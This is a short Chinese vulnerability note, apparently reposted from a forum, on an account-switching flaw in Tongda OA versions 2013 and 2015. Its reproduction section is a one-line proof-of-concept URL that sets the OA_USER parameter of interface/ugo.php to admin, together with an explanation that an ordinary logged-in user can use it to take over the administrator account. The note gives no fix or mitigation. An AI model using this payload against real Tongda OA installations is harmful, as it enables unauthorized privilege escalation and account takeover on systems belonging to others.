# 通达oa 任意账号跳转

> 原文：[https://www.zhihuifly.com/t/topic/3335](https://www.zhihuifly.com/t/topic/3335)

# 通达oa 任意账号跳转

## 一、漏洞简介

需要登录

## 二、漏洞影响

2013、2015版本

## 三、复现过程

POC:

```
http://0-sec.org/interface/ugo.php?OA_USER=admin 
```

通过控制OA_USER参数进行任意⽤户的跳转，⽐如说你现在是个普通权限的⽤户，使用这个⻚面即可跳转到admin用户下面。